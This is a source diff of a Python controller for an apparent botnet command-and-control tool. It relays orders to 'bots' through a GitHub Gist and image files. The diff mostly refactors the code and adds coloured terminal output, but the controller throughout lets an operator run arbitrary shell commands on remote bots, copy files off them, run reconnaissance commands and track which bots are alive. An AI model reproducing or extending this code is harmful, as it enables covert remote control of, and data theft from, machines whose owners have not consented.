@@ -1,83 +1,28 @@
 import argparse
 import os
 import select
-import shutil
 import sys
 from typing import Optional, Any, Dict, Union
-import time
 
+from terminal import gray, rst, cyan, magenta, yellow, green, red
 from common import \
-    GithubGistClient, \
-    IMAGES_LIBRARY, \
     CONTROL_IMAGE, \
     UPDATE_INTERVAL, \
     KEEP_ALIVE_TIMEOUT, \
     now_ms, \
     is_image, \
     decode_data, \
-    encode_data
+    encode_data, \
+    format_timestamp, \
+    ParticipantBase
 
 
-class Controller:
-
-    def __init__(
-        self,
-        workdir: str,
-        gist: str,
-        token: str,
-        author: Optional[str] = None,
-        recreate_workdir: bool = False,
-        skip_init_reset: bool = False,
-        skip_init_pull: bool = False,
-    ) -> None:
-        self._workdir = os.path.abspath(workdir)
-        self._gist = gist
-        self._token = token
-        self._recreate_workdir = recreate_workdir
-        self._skip_init_reset = skip_init_reset
-        self._skip_init_pull = skip_init_pull
-
-        self._lib_client = GithubGistClient(
-            gist=IMAGES_LIBRARY,
-            repo_dir=os.path.join(self._workdir, 'lib'),
-        )
-
-        self._comm_client = GithubGistClient(
-            gist=self._gist,
-            token=self._token,
-            repo_dir=os.path.join(self._workdir, 'comm'),
-            author=author,
-        )
-
-    def _ensure_workdir(self) -> None:
-        if os.path.isdir(self._workdir) and self._recreate_workdir:
-            print(f'removing and re-creating workdir {self._workdir}...')
-            shutil.rmtree(self._workdir)
-        if not os.path.isdir(self._workdir):
-            os.makedirs(self._workdir)
-        os.chdir(self._workdir)
-        print(f'workdir ready and set as the process current working dir')
+class Controller(ParticipantBase):
 
     def _setup(self) -> None:
-        self._ensure_workdir()
+        super()._setup()
 
-        print('initializing images library to...')
-        self._lib_client.init(
-            skip_reset=self._skip_init_reset,
-            skip_pull=self._skip_init_pull,
-        )
-        self._load_lib_images()
-
-        print(
-            f'initializing the gist from {self._comm_client.get_https_url(with_token=False)}'
-            f' to {self._comm_client.get_repo_dir()} ...'
-        )
-        self._comm_client.init(
-            skip_reset=self._skip_init_reset,
-            skip_pull=self._skip_init_pull,
-        )
-
-        self._current_timestamp = now_ms()
+        self._current_timestamp: int = now_ms()
         self._bots = {}
         self._pending_commands = {}
 
@@ -89,8 +34,9 @@ class Controller:
         while True:
             self._update_state()
             print(
-                '\nEnter a command. Use ? or help to show help.\n'
-                f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
+                f'\nAuto update in {cyan}{UPDATE_INTERVAL}{rst} seconds. Press {yellow}enter{rst} to force update.\n'
+                f'Press {red}Ctrl-C{rst} to stop.\n'
+                f'Enter a command. Use {cyan}?{rst} or {cyan}help{rst} to show help.\n'
                 '> ',
                 end='',
             )
@@ -108,7 +54,7 @@ class Controller:
 
     @staticmethod
     def stop() -> None:
-        print('Stopping the controller. Note that the bots might still be running.')
+        print('\nStopping the controller. Note that the bots might still be running.')
         print('Use terminate command to stop a specific bot.')
 
     def _update_bot(self, name: str, data: Any) -> bool:
@@ -162,7 +108,7 @@ class Controller:
         return True
 
     def _update_state(self) -> None:
-        print('updating state ...')
+        print(f'{gray}updating state ...{rst}')
         self._current_timestamp = now_ms()
 
         self._comm_client.pull_changes()
@@ -205,19 +151,20 @@ class Controller:
 
         self._comm_client.commit_and_push_if_needed()
 
+        print(f"{gray}successful update on {green}{format_timestamp(self._current_timestamp)}{rst}")
+
         pass
 
-    def _load_lib_images(self):
-        self._lib_images = set(filter(is_image, os.listdir('lib')))
-        print(f'library contains {len(self._lib_images)} images:')
-        for img in self._lib_images:
-            print(f'  {img}')
-        if CONTROL_IMAGE not in self._lib_images:
-            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')
-
     def _print_bots(self) -> None:
-        print('Bots:')
-        print(self._bots)
+        print(f'\nBOTS ({cyan}{len(self._bots)}{rst}):')
+        for bot_name, bot_data in self._bots.items():
+            pretty_name = bot_name[0:-4]  # strip .png or .jpg extension
+            record_age: float = (self._current_timestamp - bot_data['last_update']) / 1000
+            print(
+                f'  bot {yellow}{pretty_name}{rst}\n'
+                f'    last update {red if record_age > 70 else green}{record_age:.2f}{rst} seconds ago'
+            )
+        print('')
         pass
 
     def _is_valid_bot(self, bot: str) -> bool:
@@ -232,7 +179,7 @@ class Controller:
     def _create_command(self, name: str, args: Dict[str, Union[str, bool, int]]) -> Dict[str, Union[str, bool, int]]:
         header = {
             'id': self._generate_new_command_id(),
-            'timestamp': time.time_ns() // 1000,  # epoch in milliseconds
+            'timestamp': now_ms(),
             'name': name,
         }
         return header + args
@@ -245,31 +192,31 @@ class Controller:
     @staticmethod
     def _print_help() -> None:
         print(
-            '\nAvailable commands:\n\n'
-            'Use Ctrl-C to stop and exit the controller.\n\n'
-            'help\n'
-            '  Prints this help.\n'
-            'bots\n'
-            '  Lists all bots and their status.\n'
-            'terminate <bot>\n'
-            '  Terminates the bot.\n'
-            'shell <bot> <command>\n'
-            '  Runs the given command on the bot using the following Python code.\n'
-            '    subprocess.run(args=[<command>], shell=True)\n'
-            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
-            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
-            'run <bot> <command>\n'
-            '  Runs the given command on the bot using the following Python code.\n'
-            '    subprocess.run(args=shlex.split(<command>), shell=False)\n'
-            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
-            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
-            'copyFrom <bot> <file name>\n'
-            'do <bot> id\n'
-            '  Alias for shell <bot> id\n'
-            'do <bot> who\n'
-            '  Alias for shell <bot> who\n'
-            'do <bot> ls <path>\n'
-            '  Alias for shell <bot> ls -lha\n'
+            f'\n{red}AVAILABLE COMMANDS:\n\n'
+            f'{cyan}help{rst}\n'
+            f'  {gray}Prints this help.{rst}\n'
+            f'{cyan}bots\n'
+            f'  {gray}Lists all bots and their status.{rst}\n'
+            f'{cyan}terminate {yellow}<bot>{rst}\n'
+            f'  {gray}Terminates the bot.{rst}\n'
+            f'{cyan}shell {yellow}<bot> {magenta}<command>{rst}\n'
+            f'  {gray}Runs the given command on the bot using the following Python code.\n'
+            f'    subprocess.run(args=[{magenta}<command>{rst}{gray}], shell={magenta}True{rst}{gray})\n'
+            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
+            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
+            f'{cyan}run {yellow}<bot> {magenta}<command>{rst}\n'
+            f'  {gray}Runs the given command on the bot using the following Python code.\n'
+            f'    subprocess.run(args={magenta}shlex.split(<command>){rst}{gray}, shell={magenta}False{rst}{gray})\n'
+            f'  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
+            f'  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.{rst}\n'
+            f'{cyan}copyFrom {yellow}<bot> {magenta}<file name>{rst}\n{gray}'
+            f'  {gray}Copies the file from the bot to the controller\'s workdir.{rst}\n'
+            f'{cyan}do {yellow}<bot>{rst} id{rst}\n'
+            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}id\n'
+            f'{cyan}do {yellow}<bot>{rst} who{rst}\n'
+            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}who{rst}\n'
+            f'{cyan}do {yellow}<bot>{rst} ls {magenta}<path>{rst}\n'
+            f'  {gray}Alias for {cyan}shell {yellow}<bot> {magenta}ls -lha <path>{rst}\n'
         )
 
     def _process_terminate_command(self, bot) -> None:
@@ -281,10 +228,10 @@ class Controller:
 
     def _process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
         if cmd is None:
-            print('Missing <command> argument!')
+            print(f'{red}Missing <command> argument!{rst}')
             return
         if cmd == '':
-            print('Invalid empty <command> argument!')
+            print(f'{red}Invalid empty <command> argument!{rst}')
             return
         self._set_command(bot, self._create_command(
             name='run',
@@ -297,10 +244,10 @@ class Controller:
 
     def _process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
         if file_name is None:
-            print('Missing <file name> argument!')
+            print(f'{red}Missing <file name> argument!{rst}')
             return
         if file_name == '':
-            print('Invalid empty <file name> argument!')
+            print(f'{red}Invalid empty <file name> argument!{rst}')
             return
         self._set_command(bot, self._create_command(
             name='copy_from',
@@ -312,7 +259,7 @@ class Controller:
 
     def _process_do_command(self, bot, action: Optional[str]) -> None:
         if action is None:
-            print('Missing do action!')
+            print(f'Missing do action!')
             return
         if action == 'id':
             self._process_run_command(bot, shell=True, cmd='id')
@@ -323,11 +270,11 @@ class Controller:
         if action.startswith('ls '):
             path = action[3:]
             if path == '':
-                print(f"Invalid path '{path}'!")
+                print(f"{red}Invalid path '{path}'!{rst}")
                 return
             self._process_run_command(bot, shell=True, cmd='ls -lha ' + path)
             return
-        print(f"Invalid do action '{action}'!")
+        print(f"{red}Invalid do action '{action}'!{rst}")
         return
 
     def _process_command(self, cmd_str) -> None:
@@ -338,6 +285,11 @@ class Controller:
         parts = cmd_str.split(sep=' ', maxsplit=1)
         cmd_name = parts[0]
 
+        if cmd_name not in {'help', '?', 'bots', 'terminate', 'shell', 'run', 'copyFrom', 'do'}:
+            print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
+            print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')
+            return
+
         if cmd_name == 'help' or cmd_name == '?':
             self._print_help()
             return
@@ -347,33 +299,41 @@ class Controller:
             return
 
         # all other commands should have format <cmd_name> <bot> <...the rest>
-        if len(parts) == 2:
-            sub_parts = parts[1].split(sep=' ', maxsplit=1)
-            bot = sub_parts[0]
-            args_str = sub_parts[1] if len(sub_parts) == 2 else None
-            if not self._is_valid_bot(bot):
-                print(f"Command '{cmd_str}'")
-                print(f"Invalid bot '{bot}' given.")
-                return
+        if len(parts) != 2:
+            print(
+                f'{red}Missing {yellow}<bot>{rst} {red}argument!\n'
+                f'Type {cyan}bots{rst}{red} to list all available bots.{rst}'
+            )
+            return
 
-            if cmd_name == 'terminate':
-                self._process_terminate_command(bot)
-                return
-            if cmd_name == 'shell':
-                self._process_run_command(bot, shell=True, cmd=args_str)
-                return
-            if cmd_name == 'run':
-                self._process_run_command(bot, shell=False, cmd=args_str)
-                return
-            if cmd_name == 'copyFrom':
-                self._process_copy_from_command(bot, file_name=args_str)
-                return
-            if cmd_name == 'do':
-                self._process_do_command(bot, action=args_str)
-                return
+        sub_parts = parts[1].split(sep=' ', maxsplit=1)
+        bot = sub_parts[0]
+        args_str = sub_parts[1] if len(sub_parts) == 2 else None
+        if not self._is_valid_bot(bot):
+            print(
+                f"{red}Invalid bot '{yellow}{bot}{rst}{red}' given!\n"
+                f"Type {cyan}bots{rst}{red} to list all available bots.{rst}"
+            )
+            return
 
-        print(f"Invalid or unknown command '{cmd_str}'!")
-        print(f'Type ? or help to show help.')
+        if cmd_name == 'terminate':
+            self._process_terminate_command(bot)
+            return
+        if cmd_name == 'shell':
+            self._process_run_command(bot, shell=True, cmd=args_str)
+            return
+        if cmd_name == 'run':
+            self._process_run_command(bot, shell=False, cmd=args_str)
+            return
+        if cmd_name == 'copyFrom':
+            self._process_copy_from_command(bot, file_name=args_str)
+            return
+        if cmd_name == 'do':
+            self._process_do_command(bot, action=args_str)
+            return
+
+        print(f"{red}Invalid or unknown command '{cmd_str}'!{rst}")
+        print(f'Type {cyan}?{rst} or {cyan}help{rst} to show help.')
 
     pass
 
